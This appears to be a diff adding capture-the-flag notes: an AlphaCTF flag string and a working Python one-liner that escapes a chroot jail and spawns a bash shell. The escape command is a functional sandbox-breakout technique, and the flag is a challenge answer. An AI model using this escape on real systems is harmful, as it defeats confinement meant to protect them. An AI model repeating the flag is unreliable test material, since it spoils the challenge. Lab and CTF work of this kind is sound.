@@ -1,0 +1,3 @@
+flag = AlphaCTF{3a$y_Pe4SY_l3m0N_SQUe3ZY_CHRO07_E$C4p3}
+
+command(chroot escape) : python3 -c 'import os; os.mkdir("chroot-dir"); os.chroot("chroot-dir"); [os.chdir("..") for i in range(1000)]; os.chroot("."); os.system("/bin/bash")'
